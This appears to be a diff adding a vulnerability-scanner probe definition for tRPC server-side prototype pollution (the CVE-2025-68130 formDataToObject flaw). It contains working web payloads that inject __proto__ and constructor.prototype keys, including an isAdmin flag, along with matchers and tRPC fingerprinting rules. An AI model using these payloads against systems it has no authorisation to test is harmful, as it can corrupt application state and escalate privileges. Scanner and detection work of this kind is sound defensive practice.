@@ -1,0 +1,73 @@
+{
+  "category": "trpc_sspp",
+  "description": "tRPC server-side prototype pollution via formDataToObject (CVE-2025-68130, GHSA-43p4-m455-4f4j). Affects @trpc/server experimental_nextAppDirCaller path on Next.js App Router. Attacker submits form fields named __proto__.X or constructor.prototype.X to pollute Object.prototype across the entire process.",
+  "contexts": {
+    "trpc_form_data_proto": {
+      "description": "POST tRPC form input with __proto__ key — formDataToObject helper writes to Object.prototype if not patched.",
+      "tech_match": ["trpc", "@trpc/server", "@trpc/next", "next"],
+      "param_match": ["input", "json", "raw", "0"],
+      "probes": [
+        {
+          "payload": "__proto__[polluted]=COLLABORATOR&__proto__[isAdmin]=true",
+          "description": "Inject __proto__.polluted via form body. Response 200 + subsequent request reflects polluted=true on unrelated object indicates SSPP.",
+          "matchers": [
+            {"type": "status", "status": [200], "condition": "and"},
+            {"type": "word", "words": ["polluted", "isAdmin"], "condition": "or"},
+            {"type": "header_change", "header": "set-cookie"}
+          ],
+          "severity": "high",
+          "confidence_boost": 70,
+          "variables": {"collaborator": "{{collaborator}}"}
+        },
+        {
+          "payload": "constructor[prototype][polluted]=COLLABORATOR",
+          "description": "Alternative gadget — constructor.prototype path bypasses naive __proto__ filters",
+          "matchers": [
+            {"type": "status", "status": [200], "condition": "and"},
+            {"type": "collaborator", "weight": 80}
+          ],
+          "severity": "high",
+          "confidence_boost": 70,
+          "variables": {"collaborator": "{{collaborator}}"}
+        }
+      ]
+    },
+    "trpc_batch_input_proto": {
+      "description": "tRPC HTTP batch link — POST /api/trpc/<route>?batch=1 with JSON body. Some setups pass inputs through unsafe merge.",
+      "tech_match": ["trpc"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{\"0\":{\"json\":{\"__proto__\":{\"isAdmin\":true},\"value\":\"x\"}}}",
+          "description": "JSON-body batch with prototype-polluting input. Look for behavior change on subsequent unauth request.",
+          "matchers": [
+            {"type": "status", "status": [200], "condition": "and"},
+            {"type": "regex", "pattern": "\"result\":\\{\"data\":", "weight": 60}
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        }
+      ]
+    },
+    "next_app_dir_caller_sniff": {
+      "description": "Passive: detect experimental_nextAppDirCaller usage via response headers / cookie path / x-trpc-source.",
+      "tech_match": ["trpc", "next"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "",
+          "description": "tRPC fingerprint",
+          "matchers": [
+            {"type": "header", "header": "x-trpc-source", "weight": 80},
+            {"type": "regex", "pattern": "/api/trpc/", "weight": 70},
+            {"type": "regex", "pattern": "experimental_nextAppDirCaller", "weight": 90}
+          ],
+          "severity": "low",
+          "confidence_boost": 40,
+          "variables": {}
+        }
+      ]
+    }
+  }
+}
